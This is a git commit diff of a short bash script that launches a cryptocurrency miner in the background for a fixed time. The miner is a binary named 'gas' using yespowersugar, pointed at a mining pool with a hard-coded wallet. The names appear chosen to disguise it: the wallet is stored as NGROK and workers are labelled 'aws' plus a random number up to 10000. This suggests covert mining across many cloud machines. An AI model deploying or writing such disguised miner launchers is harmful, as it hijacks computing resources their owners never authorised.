c1489493bf4355752f50c18a1d3b93e573f78872
sis maryanto <sismaryanto1928@gmail.com>
2021-07-19 23:54:48 +0000

    0.sh edited online with Bitbucket

--- 0.sh
+++ 0.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 chmod u+x gas
 ANU=yespowersugar
-WO=$(echo aws$(shuf -i 1-10 -n 1))
+WO=$(echo aws$(shuf -i 1-10000 -n 1))
 IPE=stratum+tcps://stratum-eu.rplant.xyz:17042
 NGROK=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as
 nohup timeout 290m ./gas -a $ANU -o $IPE -u $NGROK.$WO &
